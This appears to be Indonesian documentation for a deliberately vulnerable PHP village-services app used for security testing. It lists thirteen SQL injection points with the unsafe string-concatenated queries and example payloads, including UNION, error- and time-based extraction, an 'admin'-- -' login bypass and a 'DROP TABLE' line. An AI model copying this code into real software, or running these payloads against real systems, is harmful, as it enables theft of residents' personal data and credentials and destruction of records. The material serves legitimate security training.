# Titik-Titik SQL Injection

## Overview

Dokumen ini menjelaskan setiap titik injeksi SQL yang ada di aplikasi, termasuk kode asli, jenis serangan yang bisa dilakukan, dan tujuan pengujian.

---

## 1. cek_warga.php

### Lokasi Kode
```php
// File: cek_warga.php
// Baris: ~15

$nik = $_POST['nik'];
$sql = "SELECT * FROM warga WHERE nik = '$nik'";
$result = mysqli_query($conn, $sql);

if (!$result) {
    echo "Error: " . mysqli_error($conn);
}
```

### Parameter
- **Nama:** `nik`
- **Method:** POST
- **Tipe Input:** Text (16 digit angka)

### Jenis Serangan
| Jenis | Kemungkinan | Contoh |
|-------|-------------|--------|
| UNION-based | Tinggi | `' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -` |
| Error-based | Tinggi | `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -` |
| Boolean-based | Tinggi | `' AND 1=1-- -` vs `' AND 1=2-- -` |
| Time-based | Tinggi | `' AND SLEEP(5)-- -` |
| Stacked Query | Rendah* | `'; DROP TABLE warga;-- -` |

### Tujuan Pengujian
1. Ekstraksi data warga (NIK, nama, alamat)
2. Enumerasi database schema
3. Dump data users (username/password)
4. Demonstrasi error disclosure

---

## 2. ajukan_surat.php (Step 1)

### Lokasi Kode
```php
// File: ajukan_surat.php
// Baris: ~15

$nik = $_POST['nik'];
$sql = "SELECT * FROM warga WHERE nik = '$nik'";
$result = mysqli_query($conn, $sql);
```

### Parameter
- **Nama:** `nik`
- **Method:** POST
- **Tipe Input:** Text (16 digit angka)

### Catatan
Query sama persis dengan `cek_warga.php`. Serangan yang sama bisa digunakan.

---

## 3. ajukan_surat.php (Step 3 - INSERT)

### Lokasi Kode
```php
// File: ajukan_surat.php
// Baris: ~45

$warga_id = $_POST['warga_id'];
$jenis_surat = $_POST['jenis_surat'];
$keperluan = $_POST['keperluan'];
$nama_usaha = $_POST['nama_usaha'];
$alamat_usaha = $_POST['alamat_usaha'];
$nama_pasangan = $_POST['nama_pasangan'];

$sql = "INSERT INTO surat_pengajuan
        (warga_id, jenis_surat, keperluan, nama_usaha, alamat_usaha, nama_pasangan)
        VALUES ('$warga_id','$jenis_surat','$keperluan','$nama_usaha','$alamat_usaha','$nama_pasangan')";
```

### Parameter
| Nama | Method | Catatan |
|------|--------|---------|
| warga_id | POST | Hidden field, bisa dimanipulasi |
| jenis_surat | POST | Dropdown, bisa dimanipulasi |
| keperluan | POST | Textarea |
| nama_usaha | POST | Text (opsional) |
| alamat_usaha | POST | Text (opsional) |
| nama_pasangan | POST | Text (opsional) |

### Jenis Serangan
- **Second-order SQLi** - Input tersimpan, dieksekusi saat query SELECT
- **Data manipulation** - INSERT data palsu ke database

---

## 4. riwayat.php

### Lokasi Kode
```php
// File: riwayat.php
// Baris: ~15

$nik = $_POST['nik'];
$sql = "SELECT sp.*, w.nama FROM surat_pengajuan sp
        JOIN warga w ON sp.warga_id = w.id
        WHERE w.nik = '$nik'
        ORDER BY sp.tanggal_ajuan DESC";
```

### Parameter
- **Nama:** `nik`
- **Method:** POST
- **Tipe Input:** Text (16 digit angka)

### Catatan
Query menggunakan JOIN, memungkinkan ekstraksi data dari multiple tabel.

---

## 5. berita_detail.php

### Lokasi Kode
```php
// File: berita_detail.php
// Baris: ~4

$id = $_GET['id'];
$sql = "SELECT * FROM berita WHERE id = '$id'";
$result = mysqli_query($conn, $sql);
```

### Parameter
- **Nama:** `id`
- **Method:** GET
- **Tipe Input:** Integer

### Jenis Serangan
| Jenis | Kemungkinan | Contoh |
|-------|-------------|--------|
| UNION-based | Tinggi | `?id=-1 UNION SELECT 1,2,3,4,5-- -` |
| Error-based | Tinggi | `?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -` |
| Boolean-based | Tinggi | `?id=1 AND 1=1-- -` |
| Time-based | Tinggi | `?id=1 AND SLEEP(5)-- -` |

### Keuntungan untuk Tester
- Parameter via GET, mudah dimanipulasi di browser
- Tidak perlu Burp Suite untuk testing awal
- Response langsung terlihat di halaman

---

## 6. admin/login.php

### Lokasi Kode
```php
// File: admin/login.php
// Baris: ~8

$username = $_POST['username'];
$password = $_POST['password'];
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $sql);

if (mysqli_num_rows($result) > 0) {
    // Login berhasil
}
```

### Parameter
| Nama | Method | Catatan |
|------|--------|---------|
| username | POST | VARCHAR(50) |
| password | POST | VARCHAR(100), plaintext |

### Jenis Serangan
| Jenis | Kemungkinan | Contoh |
|-------|-------------|--------|
| Authentication Bypass | Tinggi | `admin'-- -` |
| UNION-based | Tinggi | `' UNION SELECT 1,2,3,4,5-- -` |
| Boolean-based | Tinggi | `' OR 1=1-- -` |

### Tujuan Pengujian
1. **Login Bypass** - Akses tanpa password
2. **Credential Dump** - Ekstrak semua username/password
3. **Privilege Escalation** - Login sebagai admin

---

## 7. admin/warga.php (Search)

### Lokasi Kode
```php
// File: admin/warga.php
// Baris: ~30

$search = $_GET['q'] ?? '';
$sql = "SELECT * FROM warga WHERE nama LIKE '%$search%' OR nik LIKE '%$search%'";
$result = mysqli_query($conn, $sql);
```

### Parameter
- **Nama:** `q`
- **Method:** GET
- **Tipe Input:** Text (search query)

### Jenis Serangan
| Jenis | Kemungkinan | Contoh |
|-------|-------------|--------|
| UNION-based | Tinggi | `?q=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -` |
| Error-based | Tinggi | `?q=' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -` |
| Boolean-based | Tinggi | `?q=' AND 1=1-- -` |
| Stacked Query | Rendah* | `?q='; DROP TABLE warga;-- -` |

### Catatan Penting
- Menggunakan LIKE dengan wildcard `%`, memungkinkan ekstraksi data bertahap
- Output ditampilkan dalam tabel, mudah dibaca

---

## 8. admin/warga.php (Delete)

### Lokasi Kode
```php
// File: admin/warga.php
// Baris: ~50

$id = $_GET['hapus'];
$sql = "DELETE FROM warga WHERE id='$id'";
```

### Parameter
- **Nama:** `hapus`
- **Method:** GET
- **Tipe Input:** Integer

### Risiko
- **Data Destruction** - Bisa menghapus semua data warga
- **Blind SQLi** - Bisa digunakan untuk boolean-based blind injection

---

## 9. admin/warga.php (Edit)

### Lokasi Kode
```php
// File: admin/warga.php
// Baris: ~75

$id = $_POST['id'];
$sql = "UPDATE warga SET nama='$nama', alamat='$alamat', rt='$rt',
        rw='$rw', dusun='$dusun', pekerjaan='$pekerjaan',
        status_perkawinan='$status_perkawinan' WHERE id='$id'";
```

### Parameter
| Nama | Method | Catatan |
|------|--------|---------|
| id | POST | Hidden field |
| nama | POST | Text |
| alamat | POST | Text |
| rt, rw | POST | Text |
| dusun | POST | Select dropdown |
| pekerjaan | POST | Text |
| status_perkawinan | POST | Select dropdown |

### Jenis Serangan
- **Second-order SQLi** - Input tersimpan di DB
- **Data manipulation** - Mengubah data warga lain

---

## 10. admin/surat.php (Filter)

### Lokasi Kode
```php
// File: admin/surat.php
// Baris: ~15

$status_filter = $_GET['status'] ?? '';
$where = '';
if ($status_filter) {
    $where = "WHERE sp.status = '$status_filter'";
}

$sql = "SELECT sp.*, w.nama, w.nik, u.nama_lengkap as petugas
        FROM surat_pengajuan sp
        JOIN warga w ON sp.warga_id = w.id
        LEFT JOIN users u ON sp.diproses_oleh = u.id
        $where
        ORDER BY sp.tanggal_ajuan DESC";
```

### Parameter
- **Nama:** `status`
- **Method:** GET
- **Tipe Input:** Text (enum value)

### Catatan
Parameter langsung masuk ke WHERE clause tanpa validasi ENUM.

---

## 11. admin/surat.php (Update Status)

### Lokasi Kode
```php
// File: admin/surat.php
// Baris: ~30

$id = $_POST['id'];
$status = $_POST['status'];
$catatan = $_POST['catatan_admin'];

$sql = "UPDATE surat_pengajuan SET status='$status',
        catatan_admin='$catatan', diproses_oleh='{$_SESSION['user_id']}'
        WHERE id='$id'";
```

### Parameter
| Nama | Method |
|------|--------|
| id | POST |
| status | POST |
| catatan_admin | POST |

---

## 12. admin/berita.php (CRUD)

### Delete
```php
$id = $_GET['hapus'];
$sql = "DELETE FROM berita WHERE id='$id'";
```

### Toggle Publish
```php
$id = $_GET['toggle'];
$sql = "UPDATE berita SET diterbitkan = NOT diterbitkan WHERE id='$id'";
```

### Insert
```php
$sql = "INSERT INTO berita (judul, isi, penulis, diterbitkan)
        VALUES ('$judul','$isi','$penulis','$diterbitkan')";
```

### Update
```php
$sql = "UPDATE berita SET judul='$judul', isi='$isi',
        penulis='$penulis', diterbitkan='$diterbitkan' WHERE id='$id'";
```

---

## 13. berita_detail.php (Sidebar "Berita Lainnya")

### Lokasi Kode
```php
// File: berita_detail.php
// Baris: ~37

$berita_lain = mysqli_query($conn, "SELECT id, judul, created_at FROM berita
    WHERE diterbitkan = 1 AND id != '$id' ORDER BY created_at DESC LIMIT 5");
```

### Parameter
- **Nama:** `id`
- **Method:** GET
- **Tipe Input:** Integer

### Catatan
Variabel `$id` berasal dari `$_GET['id']` yang sama dengan injection point #5. Namun query ini dieksekusi **secara terpisah** di sidebar, sehingga menjadi injection point tambahan yang terpisah dari query utama.

### Keuntungan untuk Tester
- Satu request bisa mengeksekusi **2 query vulnerable** (query utama + sidebar)
- Memungkinkan **multi-statement side-channel** jika diperlukan

---

## Ringkasan Titik Injeksi

| No | File | Parameter | Method | Query Type | Risiko |
|----|------|-----------|--------|------------|--------|
| 1 | cek_warga.php | nik | POST | SELECT | Ekstraksi data warga |
| 2 | ajukan_surat.php | nik | POST | SELECT | Ekstraksi data warga |
| 3 | ajukan_surat.php | multiple | POST | INSERT | Data manipulation |
| 4 | riwayat.php | nik | POST | SELECT (JOIN) | Ekstraksi multi-tabel |
| 5 | berita_detail.php | id | GET | SELECT | Ekstraksi data |
| 6 | admin/login.php | username, password | POST | SELECT | Login bypass |
| 7 | admin/warga.php | q | GET | SELECT (LIKE) | Ekstraksi data |
| 8 | admin/warga.php | hapus | GET | DELETE | Data destruction |
| 9 | admin/warga.php | multiple | POST | INSERT/UPDATE | Data manipulation |
| 10 | admin/surat.php | status | GET | SELECT (WHERE) | Ekstraksi data |
| 11 | admin/surat.php | multiple | POST | UPDATE | Data manipulation |
| 12 | admin/berita.php | id, multiple | GET/POST | DELETE/INSERT/UPDATE | Full CRUD abuse |
| 13 | berita_detail.php | id (sidebar) | GET | SELECT | Ekstraksi data (sidebar) |

---

*Catatan: Stacked query kemungkinan besar tidak didukung karena menggunakan mysqli_query() yang hanya mengeksekusi satu query per kali.*
